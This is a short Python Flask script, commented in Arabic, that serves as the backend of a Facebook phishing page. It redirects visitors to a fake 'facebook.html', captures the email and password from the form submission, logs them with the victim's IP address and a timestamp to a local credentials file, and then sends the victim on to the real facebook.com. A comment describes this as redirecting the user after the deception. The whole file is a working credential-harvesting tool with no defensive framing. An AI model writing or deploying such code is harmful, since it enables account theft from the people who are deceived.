from flask import Flask, request, redirect
import os
from datetime import datetime

app = Flask(__name__)

# التأكد من وجود مجلد التخزين
if not os.path.exists("logs"):
    os.makedirs("logs")

@app.route("/")
def home():
    return redirect("/facebook.html")

@app.route("/submit", methods=["POST"])
def submit():
    email = request.form.get("email")
    password = request.form.get("password")
    user_ip = request.remote_addr
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # تخزين البيانات في ملف
    with open("logs/credentials.txt", "a") as f:
        f.write(f"[{time}] IP: {user_ip}\nEmail: {email}\nPassword: {password}\n\n")

    # تحويل المستخدم لموقع حقيقي بعد الخداع
    return redirect("https://facebook.com")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
